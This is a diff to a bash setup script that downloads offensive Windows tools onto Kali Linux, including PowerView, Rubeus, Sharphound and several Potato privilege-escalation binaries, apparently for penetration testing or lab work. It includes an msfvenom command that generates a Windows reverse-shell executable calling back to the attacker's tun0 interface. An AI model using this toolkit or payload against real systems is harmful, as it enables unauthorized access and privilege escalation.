@@ -1,9 +1,7 @@
 #!/bin/bash
-#
-# TODO : Compiler SharpEfsPotato, SweetPotato avec VSCode.
-#
+
 # Windows Tools ready to serve in seconds on Kali
-#
+
 # - PowerUp
 # - PowerView
 # - nc.exe
@@ -14,7 +12,6 @@
 # - Chisel
 # - PrintSpoofer
 # - Rubeus
-# - Seabelt
 # - Sharphound
 # - PsExec (PsTools)
 # - RoguePotato
@@ -22,6 +19,7 @@
 # - JuicyPotato
 # - JuicyPotatoNG
 # - RottenPotato
+# - SharpEfsPotato
 # - upload.ps1
 
 sudo apt install -y powersploit peass windows-binaries
@@ -50,10 +48,6 @@ gunzip chisel_1.9.1_windows_386.gz
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
-wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
-
-wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
-
 wget https://download.sysinternals.com/files/PSTools.zip
 unzip PSTools.zip
 
@@ -69,11 +63,14 @@ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
 unzip JuicyPotatoNG.zip
 
-wget https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe
- 
 wget https://raw.githubusercontent.com/adann0/py_upload/main/upload.ps1
 
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
+
+SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
+cp $SCRIPT_DIR/bin/SharpEfsPotato.exe .
+cp $SCRIPT_DIR/bin/MSFRottenPotato.exe .
+cp $SCRIPT_DIR/bin/Rubeus.exe .
 
 rm -f *.zip *.gz
 
